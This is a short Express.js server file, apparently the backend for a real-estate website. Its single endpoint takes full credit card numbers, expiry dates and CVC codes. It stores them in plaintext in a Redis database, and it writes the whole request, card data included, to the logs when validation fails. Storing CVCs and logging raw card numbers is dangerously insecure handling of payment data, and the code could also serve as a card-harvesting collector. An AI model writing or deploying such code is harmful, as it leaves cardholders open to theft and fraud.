const express = require('express');
const bodyParser = require('body-parser');
const { Redis } = require('@upstash/redis');
const cors = require('cors');

const app = express();

// Define allowed origins
const allowedOrigins = ['http://localhost:3000', 'https://sun-realty-homes-cl.vercel.app'];

app.use(cors({
  origin: function (origin, callback) {
    // Allow requests with no origin (like mobile apps or curl requests)
    if (!origin) return callback(null, true);
    if (allowedOrigins.indexOf(origin) === -1) {
      const msg = 'The CORS policy for this site does not allow access from the specified Origin.';
      return callback(new Error(msg), false);
    }
    return callback(null, true);
  }
}));

app.use(bodyParser.json());

// Initialize Upstash Redis client
const redis = new Redis({
  url: process.env.UPSTASH_REDIS_URL,
  token: process.env.UPSTASH_REDIS_TOKEN
});


// Endpoint to save form data to Upstash KV database
app.post('/api/save-data', async (req, res) => {
  const { cardNumber, expirationDate, cvcCode } = req.body;

  if (!cardNumber || cardNumber.length !== 16 || !expirationDate || !cvcCode) {
    console.error('Invalid data received:', req.body);
    return res.status(400).json({ message: 'Invalid data' });
  }

  try {
    // Generate a unique key based on the current timestamp
    const timestamp = Date.now();
    const key = `form-data-${timestamp}`;

    // Save data to Upstash Redis
    await redis.set(key, JSON.stringify({ cardNumber, expirationDate, cvcCode }));

    console.log('Data saved successfully:', key);
    res.status(200).json({ message: 'Data saved successfully', key });
  } catch (err) {
    console.error('Error saving data:', err);
    res.status(500).json({ message: 'Failed to save data' });
  }
});

// Export the app
module.exports = app;

// Start the server (for local testing only)
if (process.env.NODE_ENV !== 'production') {
  app.listen(5000, () => {
    console.log('Server running on http://localhost:5000');
  });
}
